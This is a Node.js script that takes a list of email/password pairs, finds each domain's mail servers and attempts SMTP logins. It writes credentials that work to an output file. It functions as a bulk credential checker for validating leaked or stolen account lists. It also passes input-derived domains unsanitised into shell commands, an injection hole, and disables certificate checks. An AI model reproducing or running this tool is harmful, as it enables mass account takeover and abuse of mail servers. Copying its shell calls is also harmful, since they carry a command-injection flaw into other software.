console.log("Hello World");

var shell = require('shelljs');
var fs = require('fs');
var nodemailer = require('nodemailer');

function extractTLS(domain, port){

    var port = 25;
    var cert = shell.exec('timeout 5 openssl s_client -connect '+domain+':'+port+' -starttls smtp ', {silent:true}).stdout;
    cert = cert.split("\n");
    //console.log(cert);

    var protocol = '';
    for (var i=0; i<cert.length; i++){

        var str = cert[i];
        if (str.indexOf("Protocol  :") >= 0)
            protocol = str.substr(str.indexOf("Protocol  :")+"Protocol  :".length);

    }

    return {
        result: protocol !== '',
        protocol: protocol,
    }


}

function validateAccount(host, port = 465, user, pass, useSSL = false){

    var transporter = nodemailer.createTransport( {
        host: host, // hostname
        secureConnection: useSSL, // use SSL
        port: port, // port for secure SMTP
        auth: {
            user: user,
            pass: pass
        },
        tls: {
            // do not fail on invalid certs
            rejectUnauthorized: false
        }
    });

    // verify connection configuration

    return new Promise((resolve)=>{

        var verification = transporter.verify(function(error, success) {
            if (error) {

                resolve({result: false, message: error.message})
            } else {
                console.log('Server is ready to take our messages');
                resolve({result: true})
            }
        });

        //console.log("verification", verification)

    });

}

async function process(user, pass){

    var domain = user.substr( user.indexOf("@")+1 );

    var dig = shell.exec('timeout 5 dig '+domain+' mx', {silent:true}).stdout;
    dig = dig.split("\n");


    //SAMPLE
    // ;; OPT PSEUDOSECTION:
    //     ; EDNS: version: 0, flags:; udp: 4096
    // ;; QUESTION SECTION:
    //     ;google.com.			IN	MX
    //
    // ;; ANSWER SECTION:
    //     google.com.		414	IN	MX	50 alt4.aspmx.l.google.com.
    //     google.com.		414	IN	MX	40 alt3.aspmx.l.google.com.
    //     google.com.		414	IN	MX	20 alt1.aspmx.l.google.com.
    //     google.com.		414	IN	MX	30 alt2.aspmx.l.google.com.
    //     google.com.		414	IN	MX	10 aspmx.l.google.com.
    //
    // ;; Query time: 2 msec
    // ;; SERVER: 127.0.1.1#53(127.0.1.1)
    // ;; WHEN: Fri Oct 05 18:10:35 EEST 2018
    // ;; MSG SIZE  rcvd: 147
    //

    var answer = {
        result: false,
        domain: domain,
        message: '',
    };

    var ok =false;
    for (var i=0; i<dig.length; i++){

        if (!dig[i]) continue;

        if (dig[i] === ";; ANSWER SECTION:" ) {
            ok = true;
            continue;
        }
        if (dig[i].indexOf(";; Query time:") >= 0) ok = false;

        if (ok){
            //google.com.		414	IN	MX	50 alt4.aspmx.l.google.com.
            var data = dig[i].split(/[\s,]+/);

            var server = data[5];

            if (!server) continue;

            if (server[server.length-1] === '.') server = server.substr(0, server.length-1);

            var r = extractTLS(server, 25)
            if (r.result){

                var validation = await validateAccount(server, 25, user, pass, false );

                if (!validation.result) {
                    answer.message = validation.message;
                    continue;
                }

                return {
                    result: true,
                    domain: domain,
                    mx: server,
                    tls: r.protocol,
                    verified: true,
                };

            } else {

                var validation = await validateAccount(server, 25, user, pass, false );

                if (!validation.result) {
                    answer.message = validation.message;
                    continue;
                }

                return {
                    result: true,
                    domain: domain,
                    mx: server,
                    tls: '',
                    verified: true,

                }

            }
        }

    }

    return answer;
}


async function read(){

    var output = fs.createWriteStream( "output.txt", { flags: 'w' } );
    var outputErr = fs.createWriteStream( "outputErr.txt", { flags: 'w' } );

    var emails = fs.readFileSync('input.txt', 'utf8');
    emails = emails.split("\n");

    for (var i = 0; i< emails.length; i++){

        var data = emails[i].split(/[\s,]+/);

        var email = data[0];
        var pass = data[1];

        if (email !== undefined && pass !== undefined){
            var answer = await process(email, pass);

            if (answer.result) {
                output.write( answer.domain +" "+ answer.mx +" "+ answer.tls +" "+ " "+email + " "+pass+ " "+answer.verified+ "\n");
            } else {
                outputErr.write( email+" "+ pass+" "+answer.message + "\n" );
            }

        }

        if (i%1000 === 0)
            console.log("processing ", i, data)

    }

}


read();